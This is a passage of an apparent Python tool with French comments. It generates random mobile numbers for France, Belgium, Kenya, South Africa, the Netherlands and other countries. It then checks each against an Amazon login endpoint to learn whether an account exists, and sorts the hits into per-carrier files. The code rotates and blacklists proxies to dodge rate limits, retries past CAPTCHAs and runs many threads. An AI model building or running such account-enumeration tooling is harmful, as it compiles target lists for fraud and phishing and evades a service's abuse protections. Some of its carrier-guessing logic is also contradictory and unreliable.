                # Format: +254 7XX XXX XXX
                if len(operator_prefix) <= 4:  # Préfixes comme 0722, 0733, etc.
                    suffix_length = 9 - len(operator_prefix) + 1  # +1 car on enlève le premier chiffre
                    candidate = f"{chosen_prefix}{operator_prefix[1:]}{random.randint(0, 10**suffix_length-1):0{suffix_length}d}"
                else:  # Préfixes courts comme 071, 072, 082, etc.
                    candidate = f"{chosen_prefix}{operator_prefix[1:]}{random.randint(0, 9999999):07d}"
                
            elif reg == "ZA" and "ZA" in country_prefixes:
                # Format sud-africain avec préfixe opérateur
                operator_prefix = random.choice(list(south_africa_prefixes.keys()))
                # Format: +27 8X XXX XXXX
                if len(operator_prefix) <= 4:  # Préfixes comme 0722, 0733, etc.
                    suffix_length = 9 - len(operator_prefix) + 1  # +1 car on enlève le premier chiffre
                    candidate = f"{chosen_prefix}{operator_prefix[1:]}{random.randint(0, 10**suffix_length-1):0{suffix_length}d}"
                else:  # Préfixes courts comme 071, 072, 082, etc.
                    candidate = f"{chosen_prefix}{operator_prefix[1:]}{random.randint(0, 9999999):07d}"
            
            elif reg == "NL" and "NL" in country_prefixes:
                # Choisir un préfixe aléatoire parmi les opérateurs néerlandais
                operator_prefix = random.choice(list(netherlands_prefixes.keys()))
                # Format néerlandais: +31 6xx xxx xxx
                suffix_length = 9 - len(operator_prefix) + 1  # +1 car on enlève le premier chiffre
                candidate = f"{chosen_prefix}{operator_prefix[1:]}{random.randint(0, 10**suffix_length-1):0{suffix_length}d}"
            
            else:
                # Format générique pour les pays non spécifiquement traités
                candidate = f"{chosen_prefix}{random.randint(600000000, 799999999):09d}"
        
        else:
            # Format générique pour les autres pays
            if reg == "MQ":  # Martinique
                candidate = f"{chosen_prefix}696{random.randint(100000, 999999):06d}"
            elif reg == "GP":  # Guadeloupe
                candidate = f"{chosen_prefix}690{random.randint(100000, 999999):06d}"
            elif reg == "GF":  # Guyane
                candidate = f"{chosen_prefix}694{random.randint(100000, 999999):06d}"
            elif reg == "RE":  # Réunion
                candidate = f"{chosen_prefix}692{random.randint(100000, 999999):06d}"
            elif reg == "YT":  # Mayotte
                candidate = f"{chosen_prefix}639{random.randint(100000, 999999):06d}"
            elif reg == "FR":  # France métropolitaine
                candidate = f"{chosen_prefix}6{random.randint(10000000, 99999999):08d}"
            elif reg == "BE":  # Belgique
                candidate = f"{chosen_prefix}4{random.randint(10000000, 99999999):08d}"
            elif reg == "ES":  # Espagne
                candidate = f"{chosen_prefix}6{random.randint(10000000, 99999999):08d}"
            elif reg == "PT":  # Portugal
                candidate = f"{chosen_prefix}9{random.randint(10000000, 99999999):08d}"
            elif reg == "CH":  # Suisse
                candidate = f"{chosen_prefix}7{random.randint(10000000, 99999999):08d}"
            elif reg == "DE":  # Allemagne
                candidate = f"{chosen_prefix}15{random.randint(1000000, 9999999):07d}"
            elif reg == "NL":  # Pays-Bas
                candidate = f"{chosen_prefix}6{random.randint(10000000, 99999999):08d}"
            else:
                candidate = f"{chosen_prefix}{random.randint(600000000, 799999999):09d}"
    else:
        # Si aucune région n'est spécifiée, générer un format par défaut
        if chosen_prefix == "+33":  # France
            candidate = f"{chosen_prefix}6{random.randint(10000000, 99999999):08d}"
        elif chosen_prefix == "+32":  # Belgique
            candidate = f"{chosen_prefix}4{random.randint(10000000, 99999999):08d}"
        elif chosen_prefix == "+34":  # Espagne
            candidate = f"{chosen_prefix}6{random.randint(10000000, 99999999):08d}"
        elif chosen_prefix == "+351":  # Portugal
            candidate = f"{chosen_prefix}9{random.randint(10000000, 99999999):08d}"
        elif chosen_prefix == "+41":  # Suisse
            candidate = f"{chosen_prefix}7{random.randint(10000000, 99999999):08d}"
        elif chosen_prefix == "+49":  # Allemagne
            candidate = f"{chosen_prefix}15{random.randint(1000000, 9999999):07d}"
        elif chosen_prefix == "+254":  # Kenya
            candidate = f"{chosen_prefix}7{random.randint(10000000, 99999999):08d}"
        elif chosen_prefix == "+27":  # Afrique du Sud
            candidate = f"{chosen_prefix}7{random.randint(10000000, 99999999):08d}"
        elif chosen_prefix == "+31":  # Pays-Bas
            candidate = f"{chosen_prefix}6{random.randint(10000000, 99999999):08d}"
        else:
            candidate = f"{chosen_prefix}{random.randint(600000000, 799999999):09d}"
    
    # Validation avec phonenumbers
    try:
        phone_number = phonenumbers.parse(candidate, None if not region else region)
        if phonenumbers.is_valid_number(phone_number):
            return candidate
        else:
            # Si le numéro n'est pas valide, on retourne None
            return None
    except Exception:
        # En cas d'erreur de parsing, on retourne None
        return None

# Fonction pour générer un batch de candidats sans doublons
def gen_candidate_batch(prefix, region, batch_size=10000, max_attempts=30000):
    batch_set = set()
    attempts = 0
    
    print(f"Génération de {batch_size} numéros valides pour {region}...")
    
    # Générer des numéros en série pour garantir la qualité
    while len(batch_set) < batch_size and attempts < max_attempts:
        # Générer un lot de candidats
        num_to_generate = min(500, batch_size - len(batch_set))
        
        for _ in range(num_to_generate * 2):  # Multiplier pour s'assurer d'avoir assez de numéros
            candidate = gen_candidate(prefix, region)
            if candidate:  # Ne conserver que les numéros valides
                try:
                    # Validation supplémentaire
                    phone_number = phonenumbers.parse(candidate, region)
                    if phonenumbers.is_valid_number(phone_number):
                        # Format E164 pour uniformité
                        formatted = phonenumbers.format_number(phone_number, phonenumbers.PhoneNumberFormat.E164)
                        batch_set.add(formatted)
                        if len(batch_set) % 100 == 0:
                            print(f"Progrès: {len(batch_set)}/{batch_size} numéros valides générés")
                        if len(batch_set) >= batch_size:
                            break
                except Exception as e:
                    # Ignorer les erreurs de parsing
                    continue
            
            attempts += 1
            if attempts >= max_attempts:
                print(f"Nombre maximum de tentatives atteint ({max_attempts})")
                break
    
    # Limiter à la taille demandée
    result = list(batch_set)[:batch_size]
    
    print(f"Génération terminée: {len(result)} numéros valides générés")
    
    # Écrire dans NotCheckedNL.txt
    with open("NotCheckedNL.txt", "w") as file:
        file.write("\n".join(result))
    
    return result

def get_output_file(num, region=None):
    """Détermine le fichier de sortie en fonction du préfixe du numéro et de la région"""
    # Territoires d'outre-mer français
    if num.startswith("+590") and (region == "GP" or not region):
        return "Orange_Guadeloupe.txt"
    elif num.startswith("+590") and region == "MF":
        return "Orange_Saint-Martin.txt"
    elif num.startswith("+590") and region == "BL":
        return "Orange_Saint-Barthelemy.txt"
    elif num.startswith("+594"):
        return "Orange_Guyane.txt"
    elif num.startswith("+596"):
        return "Orange_Martinique.txt"
    elif num.startswith("+262") and (region == "RE" or not region):
        return "Orange_Reunion.txt"
    elif num.startswith("+262") and region == "YT":
        return "Orange_Mayotte.txt"
    # Pays européens
    elif num.startswith("+33"):
        # Pour la France, on peut ajouter une distinction par opérateur
        operator = identify_operator(num, "FR")
        if operator:
            if "Orange" in operator:
                return "Orange_France.txt"
            elif "SFR" in operator:
                return "SFR_France.txt"
            elif "Bouygues" in operator:
                return "Bouygues_France.txt"
            elif "Free" in operator:
                return "Free_France.txt"
            elif "Fixe" in operator:
                return "Fixe_France.txt"
        return "Inconnu_France.txt"
    elif num.startswith("+32"):
        # Pour la Belgique, distinction par opérateur
        operator = identify_operator(num, "BE")
        if operator:
            if "Proximus" in operator:
                return "Proximus_Belgique.txt"
            elif "Orange" in operator:
                return "Orange_Belgique.txt"
            elif "Base" in operator:
                return "Base_Belgique.txt"
            elif "Telenet" in operator:
                return "Telenet_Belgique.txt"
            elif "Fixe" in operator:
                return "Fixe_Belgique.txt"
        return "Inconnu_Belgique.txt"
    elif num.startswith("+34"):
        # Pour l'Espagne, distinction par opérateur
        operator = identify_operator(num, "ES")
        if operator:
            if "Movistar" in operator:
                return "Movistar_Espagne.txt"
            elif "Vodafone" in operator:
                return "Vodafone_Espagne.txt"
            elif "Orange" in operator:
                return "Orange_Espagne.txt"
            elif "Yoigo" in operator:
                return "Yoigo_Espagne.txt"
            elif "Fixe" in operator:
                return "Fixe_Espagne.txt"
        return "Inconnu_Espagne.txt"
    elif num.startswith("+351"):
        # Pour le Portugal, distinction par opérateur
        operator = identify_operator(num, "PT")
        if operator:
            if "MEO" in operator:
                return "MEO_Portugal.txt"
            elif "Vodafone" in operator:
                return "Vodafone_Portugal.txt"
            elif "NOS" in operator:
                return "NOS_Portugal.txt"
            elif "Fixe" in operator:
                return "Fixe_Portugal.txt"
        return "Inconnu_Portugal.txt"
    elif num.startswith("+41"):
        # Pour la Suisse, distinction par opérateur
        operator = identify_operator(num, "CH")
        if operator:
            if "Swisscom" in operator:
                return "Swisscom_Suisse.txt"
            elif "Sunrise" in operator:
                return "Sunrise_Suisse.txt"
            elif "Salt" in operator:
                return "Salt_Suisse.txt"
            elif "Fixe" in operator:
                return "Fixe_Suisse.txt"
        return "Inconnu_Suisse.txt"
    elif num.startswith("+49"):
        # Pour l'Allemagne, distinction par opérateur
        operator = identify_operator(num, "DE")
        if operator:
            if "Deutsche Telekom" in operator:
                return "DeutscheTelekom_Allemagne.txt"
            elif "Vodafone" in operator:
                return "Vodafone_Allemagne.txt"
            elif "O2" in operator:
                return "O2_Allemagne.txt"
            elif "E-Plus" in operator:
                return "E-Plus_Allemagne.txt"
            elif "Fixe" in operator:
                return "Fixe_Allemagne.txt"
        return "Inconnu_Allemagne.txt"
    elif num.startswith("+254"):
        # Pour le Kenya, distinction par opérateur
        operator = identify_operator(num, "KE")
        if operator:
            if "Safaricom" in operator:
                return "Safaricom_Kenya.txt"
            elif "Airtel" in operator:
                return "Airtel_Kenya.txt"
            elif "Telkom" in operator:
                return "Telkom_Kenya.txt"
            elif "Fixe" in operator:
                return "Fixe_Kenya.txt"
        return "Inconnu_Kenya.txt"
    elif num.startswith("+27"):
        # Pour l'Afrique du Sud, distinction par opérateur
        operator = identify_operator(num, "ZA")
        if operator:
            if "Vodacom" in operator:
                return "Vodacom_AfriqueDuSud.txt"
            elif "MTN" in operator:
                return "MTN_AfriqueDuSud.txt"
            elif "Cell C" in operator:
                return "CellC_AfriqueDuSud.txt"
            elif "Telkom" in operator:
                return "Telkom_AfriqueDuSud.txt"
            elif "Fixe" in operator:
                return "Fixe_AfriqueDuSud.txt"
        return "Inconnu_AfriqueDuSud.txt"
    elif num.startswith("+31"):
        # Pour les Pays-Bas, on peut ajouter une distinction par opérateur
        operator = identify_operator(num, "NL")
        if operator:
            if "KPN" in operator:
                return "KPN_PaysBas.txt"
            elif "Vodafone" in operator:
                return "Vodafone_PaysBas.txt"
            elif "T-Mobile" in operator:
                return "TMobile_PaysBas.txt"
            elif "O2" in operator:
                return "O2_PaysBas.txt"
            elif "Tele2" in operator:
                return "Tele2_PaysBas.txt"
            elif "Orange" in operator:
                return "Orange_PaysBas.txt"
            elif "Fixe" in operator:
                return "Fixe_PaysBas.txt"
        return "Inconnu_PaysBas.txt"
    else:
        return "Inconnu_Autres.txt"

def get_proxy():
    """Récupère un proxy du pool et le remet en fin de file, en évitant les proxies blacklistés"""
    if proxy_pool.empty() or not valid_proxies:  # Si pas de proxy ou pool vide
        return None
    
    # On essaie jusqu'à 3 fois de trouver un proxy qui n'est pas blacklisté
    for _ in range(3):
        try:
            proxy = proxy_pool.get(block=False)
            proxy_url = next(iter(proxy.values()))  # Récupère l'URL du proxy
            
            if proxy_url in blacklisted_proxies:
                continue  # Essayer le prochain proxy
                
            proxy_pool.put(proxy)  # Remettre le proxy dans la file pour réutilisation
            return proxy
        except queue.Empty:
            return None
    
    return None  # Si tous les proxies sont blacklistés ou le pool est vide

def get_session():
    """Récupère une session du pool et la remet en fin de file"""
    try:
        session = session_pool.get(block=False)
        session_pool.put(session)  # Remettre la session dans la file pour réutilisation
        return session
    except queue.Empty:
        # Si le pool est vide, créer une nouvelle session
        new_session = create_session()
        session_pool.put(new_session)
        return new_session

def update_stats(valid):
    """Met à jour les statistiques globales"""
    with stats_lock:
        stats["checked"] += 1
        if valid:
            stats["valid"] += 1
        else:
            stats["invalid"] += 1
        
        # Afficher les statistiques toutes les 50 vérifications
        if stats["checked"] % 50 == 0:
            elapsed = time.time() - stats["start_time"]
            speed = stats["checked"] / elapsed if elapsed > 0 else 0
            print(f"\n[STATS] Vérifiés: {stats['checked']} | Valides: {stats['valid']} | Invalides: {stats['invalid']} | Erreurs: {stats['errors']} | Vitesse: {speed:.2f} num/s")

def fun_action(num, region=None, max_retries=3, initial_timeout=1.0):
    num = num.strip()
    if num.isnumeric() and "+" not in num:
        num = f"+{num}"
    
    # Vérifier si le numéro est valide avec phonenumbers
    try:
        phone_obj = phonenumbers.parse(num, region)
        if not phonenumbers.is_valid_number(phone_obj):
            print(f"\033[31m[-]\033[0m | Numéro invalide | {num}")
            update_stats(False)
            return False
    except Exception:
        print(f"\033[31m[-]\033[0m | Format invalide | {num}")
        update_stats(False)
        return False
        
    # Vérifier si le numéro est déjà dans le cache
    with results_cache_lock:
        if num in results_cache:
            result = results_cache[num]
            update_stats(result)
            print(f"{'\033[32m[+]\033[0m' if result else '\033[31m[-]\033[0m'} | Method: {method} | {num} | CACHE")
            return result
    
    amazon = Amazon(num)
    amazon.data['email'] = num

    # Liste des proxies à éviter pour cette requête spécifique
    bad_proxies = set()
    
    # Mode direct si pas de proxies valides
    direct_mode = not valid_proxies
    
    # Obtenir une session du pool
    session = get_session()
    
    # Tentatives avec backoff exponentiel et délai progressif
    for attempt in range(max_retries):
        if direct_mode:
            proxies = None
        else:
            proxies = get_proxy()
            
            # Si aucun proxy disponible ou trop d'échecs, passer en mode direct
            if not proxies or attempt > 0:
                proxies = None
                direct_mode = True
        
        # Éviter les proxies problématiques
        if proxies and any(str(proxies).find(bp) >= 0 for bp in bad_proxies):
            proxies = None
            direct_mode = True
            
        # Timeout ajusté pour la tentative
        current_timeout = initial_timeout * (1.5 ** attempt)
        
        try:
            # Effectuer la requête avec le timeout ajusté et la session réutilisable
            start_time = time.time()
            res = session.post(amazon.url, headers=amazon.headers, cookies=amazon.cookies, 
                              data=amazon.data, verify=False, proxies=proxies, 
                              timeout=current_timeout)
            response_time = time.time() - start_time
            
            # Enregistrer les stats du proxy utilisé si applicable
            if proxies and not direct_mode:
                proxy_url = next(iter(proxies.values()))
                if proxy_url in proxy_stats:
                    proxy_stats[proxy_url]["speed"] = response_time
            
            # Vérifier le code de statut HTTP
            if res.status_code >= 400:
                if res.status_code in [429, 403]:  # Rate limit ou accès interdit
                    # Blacklister ce proxy si utilisé
                    if proxies:
                        proxy_url = next(iter(proxies.values()))
                        bad_proxies.add(proxy_url)
                        if proxy_url in proxy_stats:
                            proxy_stats[proxy_url]["failure"] += 1
                    
                    # Courte attente avant la prochaine tentative
                    time.sleep(0.5 * (attempt + 1))
                    continue
                    
                elif res.status_code >= 500:  # Erreur serveur
                    time.sleep(0.5 * (attempt + 1))
                    continue
            
            res_text = res.text
            
            # Vérifier si la réponse contient des indications de rate limiting ou de blocage
            if "rate exceeded" in res_text.lower() or "too many requests" in res_text.lower():
                # Blacklister ce proxy si utilisé
                if proxies:
                    proxy_url = next(iter(proxies.values()))
                    bad_proxies.add(proxy_url)
                    if proxy_url in proxy_stats:
                        proxy_stats[proxy_url]["failure"] += 1
                
                # Courte attente avant la prochaine tentative
                time.sleep(0.5 * (attempt + 1))
                continue
                
            # Validité du numéro basée sur la présence de "ap_change_login_claim"
            result = "ap_change_login_claim" in res_text
            
            # Double vérification pour éviter les faux négatifs
            if not result and "captcha" in res_text.lower():
                # Détecter les challenges CAPTCHA qui peuvent donner des faux négatifs
                print(f"\033[33m[!]\033[0m | CAPTCHA détecté | {num} | Tentative {attempt+1}/{max_retries}")
                time.sleep(1.0)  # Attente plus longue pour le CAPTCHA
                continue
                
            # Enregistrer le résultat dans le cache
            with results_cache_lock:
                results_cache[num] = result
            
            # Enregistrer le succès du proxy si utilisé
            if proxies and not direct_mode:
                proxy_url = next(iter(proxies.values()))
                if proxy_url in proxy_stats:
                    proxy_stats[proxy_url]["success"] += 1
            
            # Déterminer le fichier de sortie et écrire le numéro validé
            if result:
                output_file = get_output_file(num, region)
                with open(output_file, "a") as ff:
                    ff.write(f"{num}\n")
                print(f"\033[32m[+]\033[0m | Method: {method} | {num} | {'PROXY' if proxies else 'DIRECT'}")
            else:
                print(f"\033[31m[-]\033[0m | Method: {method} | {num} | {'PROXY' if proxies else 'DIRECT'}")
                
            update_stats(result)
            return result
                
        except requests.exceptions.ProxyError as e:
            # Marquer ce proxy comme problématique et blacklister globalement
            if proxies:
                proxy_url = next(iter(proxies.values()))
                bad_proxies.add(proxy_url)
                with stats_lock:
                    blacklisted_proxies.add(proxy_url)
                if proxy_url in proxy_stats:
                    proxy_stats[proxy_url]["failure"] += 1
            # Pas d'attente, essayer directement ou avec un autre proxy
            continue
            
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout):
            # Timeout - blacklister ce proxy si utilisé
            if proxies:
                proxy_url = next(iter(proxies.values()))
                bad_proxies.add(proxy_url)
                if proxy_url in proxy_stats:
                    proxy_stats[proxy_url]["failure"] += 1
            # Pas d'attente, essayer directement
            continue
            
        except requests.exceptions.ConnectionError as e:
            # Problème de connexion - blacklister ce proxy si utilisé
            if proxies:
                proxy_url = next(iter(proxies.values()))
                bad_proxies.add(proxy_url)
                if proxy_url in proxy_stats:
                    proxy_stats[proxy_url]["failure"] += 1
            # Pas d'attente, essayer directement
            continue
            
        except Exception as e:
            # Autres erreurs - log mais continuer
            with stats_lock:
                stats["errors"] += 1
            logging.error(f"Erreur lors de la vérification du numéro {num}: {str(e)}")
            # Attente courte pour les erreurs inconnues
            time.sleep(0.2)
            continue
    
    # Si toutes les tentatives ont échoué
    with stats_lock:
        stats["errors"] += 1
    
    # Mettre en cache l'échec pour éviter de réessayer constamment
    with results_cache_lock:
        results_cache[num] = False
        
    print(f"\033[31m[-]\033[0m | Method: {method} | {num} | FAILED (après {max_retries} tentatives)")
    return False

def watch_file(file_path, max_check_time=None, batch_size=100, region=None):
    """Surveille le fichier pour détecter de nouveaux numéros et supprime les doublons.
    
    Args:
        file_path: Chemin du fichier à surveiller
        max_check_time: Temps maximum de vérification en secondes (None = illimité)
        batch_size: Nombre de numéros à vérifier par lot
        region: Code de région pour la vérification des numéros
    """
    checked_numbers = set()
    start_time = time.time()
    last_batch_time = time.time()
    print(f"Surveillance du fichier: {file_path}")
    print(f"Temps max de vérification: {max_check_time if max_check_time else 'illimité'} secondes")
    
    # Variables pour le contrôle adaptatif de la vitesse
    current_batch_size = batch_size
    min_batch_size = 20
    max_batch_size = 1000  # Augmenter la taille maximale des lots
    success_rate_history = []
    error_count_history = []
    speed_history = []
    
    # Vérifier si le fichier existe avant de commencer la surveillance
    if not os.path.exists(file_path):
        print(f"Erreur : le fichier '{file_path}' n'existe pas.")
        return
    
    last_modified_time = os.path.getmtime(file_path)
    
    # Fonction pour gérer l'interruption par Ctrl+C
    def signal_handler(sig, frame):
        print("\n\nInterruption détectée. Arrêt propre...")
        print(f"Statistiques finales: {stats['checked']} numéros vérifiés, {stats['valid']} valides")
        sys.exit(0)
    
    # Enregistrer le gestionnaire de signal
    signal.signal(signal.SIGINT, signal_handler)
    
    # Fonction pour ajuster la taille du batch en fonction des performances
    def adjust_batch_size():
        nonlocal current_batch_size, success_rate_history, error_count_history, speed_history
        
        # Garder seulement les 5 dernières valeurs pour l'historique
        if len(success_rate_history) > 5:
            success_rate_history = success_rate_history[-5:]
        if len(error_count_history) > 5:
            error_count_history = error_count_history[-5:]
        if len(speed_history) > 5:
            speed_history = speed_history[-5:]
        
        # S'assurer qu'il y a assez de données pour calculer des moyennes
        if not success_rate_history or not error_count_history or not speed_history:
            return current_batch_size
            
        # Calculer les moyennes
        avg_success_rate = sum(success_rate_history) / max(len(success_rate_history), 1)
        avg_error_rate = sum(error_count_history) / max(len(error_count_history), 1)
        avg_speed = sum(speed_history) / max(len(speed_history), 1)
        
        # Ajuster la taille du batch en fonction des performances
        if avg_error_rate > 0.2:  # Si plus de 20% d'erreurs, réduire la taille
            current_batch_size = max(min_batch_size, int(current_batch_size * 0.8))
        elif avg_error_rate < 0.05 and avg_speed > 5:  # Si peu d'erreurs et bonne vitesse, augmenter plus rapidement
            current_batch_size = min(max_batch_size, int(current_batch_size * 1.3))
        elif avg_success_rate > 0.9 and avg_error_rate < 0.1:  # Sinon augmenter modérément
            current_batch_size = min(max_batch_size, int(current_batch_size * 1.1))
        
        return current_batch_size
    
    while True:
        # Vérifier si le temps maximum est dépassé
        if max_check_time and time.time() - start_time > max_check_time:
            print(f"Temps maximum de vérification ({max_check_time}s) atteint. Arrêt.")
            break
            
        try:
            # Vérifier si le fichier existe toujours
            if not os.path.exists(file_path):
                print(f"Fichier {file_path} introuvable. Attente...")
                time.sleep(1.0)
                continue
                
            # Vérifier si le fichier a été modifié depuis la dernière vérification
            try:
                current_modified_time = os.path.getmtime(file_path)
            except OSError as e:
                print(f"Erreur d'accès au fichier: {e}")
                time.sleep(0.5)
                continue
                
            if current_modified_time <= last_modified_time and len(checked_numbers) > 0:
                # Fichier non modifié, attendre avant la prochaine vérification
                time.sleep(0.5)
                continue
                
            # Mettre à jour le temps de dernière modification
            last_modified_time = current_modified_time
            
            try:
                with open(file_path, "r") as file:
                    lines = file.readlines()
            except Exception as e:
                print(f"Erreur de lecture du fichier: {e}")
                time.sleep(0.5)
                continue
                
            # Supprimer les doublons en conservant l'ordre (optimisé)
            unique_lines = []
            seen = set()
            for line in lines:
                line = line.strip()
                if line and line not in seen:
                    seen.add(line)
                    unique_lines.append(line)
                    
            if len(unique_lines) != len(lines):
                print("Doublons détectés et supprimés dans le fichier.")
                try:
                    with open(file_path, "w") as file:
                        file.write("\n".join(unique_lines) + ("\n" if unique_lines else ""))
                    # Mettre à jour le temps de dernière modification après l'écriture
                    last_modified_time = os.path.getmtime(file_path)
                except Exception as e:
                    print(f"Erreur lors de l'écriture des numéros dédupliqués: {e}")
                        
            # Filtrer les numéros non encore vérifiés
            new_numbers = [num for num in unique_lines if num not in checked_numbers]
            if new_numbers:
                # Ajuster la taille du batch en fonction des performances précédentes
                current_batch_size = adjust_batch_size()
                print(f"Taille de batch adaptative: {current_batch_size}")
                
                # Traiter par lots pour éviter de bloquer trop longtemps
                for i in range(0, len(new_numbers), current_batch_size):
                    # Pause entre les lots pour éviter la surcharge
                    time_since_last_batch = time.time() - last_batch_time
                    if time_since_last_batch < 0.5:  # Pause réduite à 0.5s
                        pause_time = 0.5 - time_since_last_batch
                        print(f"Pause de {pause_time:.2f}s pour stabiliser le traitement...")
                        time.sleep(pause_time)
                    
                    batch = new_numbers[i:i+current_batch_size]
                    batch_start_time = time.time()
                    last_batch_time = batch_start_time
                    
                    print(f"Vérification du lot {i//current_batch_size+1}: {len(batch)} numéro(s)")
                    
                    # Réinitialiser les compteurs d'erreurs pour ce batch
                    batch_errors = 0
                    batch_start_checked = stats["checked"]
                    batch_start_valid = stats["valid"]
                    
                    # Utiliser ThreadPoolExecutor avec un nombre de workers adapté
                    max_workers = min(os.cpu_count() * 4, len(batch), 100)  # Augmenter le nombre de workers max
                    with ThreadPoolExecutor(max_workers=max_workers) as executor:
                        # Créer une fonction partielle pour passer la région
                        fun_action_with_region = partial(fun_action, region=region)
                        
                        # Soumettre les tâches par petits groupes pour un meilleur contrôle
                        chunk_size = max(5, min(50, len(batch) // max(max_workers, 1)))
                        results = []
                        
                        for j in range(0, len(batch), chunk_size):
                            chunk = batch[j:j+chunk_size]
                            futures = [executor.submit(fun_action_with_region, num) for num in chunk]
                            
                            # Collecter les résultats au fur et à mesure qu'ils sont disponibles
                            for future in as_completed(futures):
                                try:
                                    results.append(future.result())
                                except Exception as exc:
                                    with stats_lock:
                                        stats["errors"] += 1
                                    batch_errors += 1
                                    logging.error(f"Une tâche a généré une exception: {exc}")
                            
                            # Petite pause entre les chunks pour éviter les pics de charge
                            if j + chunk_size < len(batch):
                                time.sleep(0.05)  # Pause réduite
                    
                    # Ajouter les numéros vérifiés à l'ensemble
                    checked_numbers.update(batch)
                    
                    # Calculer les statistiques du batch
                    batch_time = time.time() - batch_start_time
                    batch_checked = stats["checked"] - batch_start_checked
                    batch_valid = stats["valid"] - batch_start_valid
                    batch_speed = batch_checked / max(batch_time, 0.001)
                    batch_success_rate = batch_valid / max(batch_checked, 1)
                    batch_error_rate = batch_errors / max(len(batch), 1)
                    
                    # Mettre à jour les historiques pour l'ajustement adaptatif
                    success_rate_history.append(batch_success_rate)
                    error_count_history.append(batch_error_rate)
                    speed_history.append(batch_speed)
                    
                    # Afficher un résumé du lot
                    print(f"Lot terminé en {batch_time:.2f}s: {batch_valid} numéros valides sur {batch_checked}")
                    print(f"Vitesse du lot: {batch_speed:.2f} num/s | Taux de succès: {batch_success_rate*100:.1f}% | Erreurs: {batch_errors}")
                    
                    # Afficher les statistiques globales
                    elapsed = time.time() - stats["start_time"]
                    speed = stats["checked"] / max(elapsed, 0.001)
                    print(f"[STATS] Total: {stats['checked']} | Valides: {stats['valid']} | Vitesse moyenne: {speed:.2f} num/s")
            else:
                # Aucun nouveau numéro, attendre avant la prochaine vérification
                time.sleep(0.5)
                
        except Exception as e:
            logging.error("Erreur lors de la surveillance du fichier", exc_info=True)
            print(f"Erreur: {e}")
            time.sleep(1.0)  # Pause plus courte pour récupérer

# Fonction pour nettoyer les proxies
def clean_proxy_pool():
    """Nettoie le pool de proxies en supprimant les proxies problématiques et en optimisant l'ordre"""
    global blacklisted_proxies
    
    if not valid_proxies:
        return
        
    print(f"[INFO] Nettoyage du pool de proxies... ({len(blacklisted_proxies)} blacklistés)")
    
    # Vider la file actuelle et récupérer tous les proxies
    current_proxies = []
    while not proxy_pool.empty():
        try:
            proxy = proxy_pool.get(block=False)
            proxy_url = next(iter(proxy.values()))
            if proxy_url not in blacklisted_proxies:
                current_proxies.append(proxy)
        except queue.Empty:
            break
    
    # Si trop de proxies sont blacklistés, réinitialiser la liste noire
    if len(blacklisted_proxies) > len(valid_proxies) * 0.8:
        print("[INFO] Trop de proxies blacklistés, réinitialisation de la liste noire")
        blacklisted_proxies.clear()
        
        # Rechargement de tous les proxies
        all_proxies = []
        for proxy in valid_proxies:
            all_proxies.append({"http": proxy, "https": proxy})
        current_proxies = all_proxies
    
    # Trier les proxies par taux de succès et vitesse
    ranked_proxies = []
    for proxy in current_proxies:
        proxy_url = next(iter(proxy.values()))
        if proxy_url in proxy_stats:
            stats = proxy_stats[proxy_url]
            total = stats["success"] + stats["failure"]
            success_rate = stats["success"] / max(total, 1)
            speed = 1.0 / max(stats["speed"], 0.001) if stats["speed"] > 0 else 0
            score = success_rate * 0.7 + (speed / 100) * 0.3  # Formule de score
            ranked_proxies.append((proxy, score))
        else:
            ranked_proxies.append((proxy, 0.5))  # Score neutre pour les proxies sans stats
    
    # Trier par score décroissant
    ranked_proxies.sort(key=lambda x: x[1], reverse=True)
    
    # Remplir la file avec les proxies triés
    for proxy, _ in ranked_proxies:
        proxy_pool.put(proxy)
    
    print(f"[INFO] Pool de proxies réorganisé, {len(ranked_proxies)} proxies actifs")

# Fonction pour optimiser le pool de proxies à intervalles réguliers
def start_proxy_optimizer(interval=60):
    """Démarre un thread qui optimise périodiquement le pool de proxies"""
    def optimizer_task():
        while True:
            time.sleep(interval)
            try:
                clean_proxy_pool()
            except Exception as e:
                logging.error(f"Erreur lors de l'optimisation des proxies: {str(e)}")
    
    optimizer = threading.Thread(target=optimizer_task, daemon=True)
    optimizer.start()
    print(f"[INFO] Optimiseur de proxies démarré (intervalle: {interval}s)")

# Démarrer l'optimiseur de proxies si des proxies sont disponibles
if valid_proxies:
    start_proxy_optimizer(60)  # Optimiser toutes les 60 secondes

# Fonction pour identifier l'opérateur d'un numéro de téléphone
def identify_operator(phone_number, region=None):
    """
    Identifie l'opérateur téléphonique d'un numéro selon le pays.
    Retourne None si l'opérateur n'est pas identifiable.
    """
    if not phone_number:
        return None
        
    # Normaliser le numéro (supprimer espaces, tirets, etc.)
    number = phone_number.replace(" ", "").replace("-", "")
    
    # Conversion du format international au format local
    if region == "FR" and number.startswith("+33"):
        local_number = "0" + number[3:]
        prefixes = france_prefixes
        fixed_prefixes = france_fixed_prefixes
        
        # Vérification spécifique pour les opérateurs français
        if local_number.startswith("06") or local_number.startswith("07"):
            # Essayer d'abord avec 4 chiffres (plus précis)
            prefix_4 = local_number[:4]  # ex: 0615, 0620, etc.
            if prefix_4 in prefixes:
                return prefixes[prefix_4]
                
            # Puis avec 3 chiffres (plus général)
            prefix_3 = local_number[:3]  # ex: 061, 062, etc.
            if prefix_3 + "X" in prefixes:  # Préfixe générique
                if prefix_3 == "061" or prefix_3 == "060":
                    return "Orange"
                elif prefix_3 == "062":
                    return "SFR"
                elif prefix_3 == "063":
                    return "Bouygues Telecom"
                elif prefix_3 == "064":
                    return "Free Mobile"
                elif prefix_3 == "070":
                    return "Orange"
                elif prefix_3 == "071":
                    return "Bouygues Telecom"
                elif prefix_3 == "072":
                    return "Free Mobile"
            
            # Si on n'a toujours pas trouvé, on tente avec 2 chiffres
            prefix_2 = local_number[:2]
            if prefix_2 == "06":
                if int(local_number[2]) <= 4:
                    return "Orange"
                elif int(local_number[2]) <= 2 and int(local_number[2]) >= 1:
                    return "SFR"
                elif int(local_number[2]) <= 3 and int(local_number[2]) >= 2:
                    return "Bouygues Telecom"
                elif int(local_number[2]) <= 4 and int(local_number[2]) >= 3:
                    return "Free Mobile"
            elif prefix_2 == "07":
                if int(local_number[2]) <= 0:
                    return "Orange"
                elif int(local_number[2]) <= 1 and int(local_number[2]) >= 0:
                    return "SFR"
                elif int(local_number[2]) <= 1 and int(local_number[2]) >= 1:
                    return "Bouygues Telecom"
                elif int(local_number[2]) <= 2 and int(local_number[2]) >= 1:
                    return "Free Mobile"
                
        # Vérification des préfixes fixes
        for prefix in sorted(fixed_prefixes.keys(), key=lambda k: (-len(k), k)):
            if local_number.startswith(prefix):
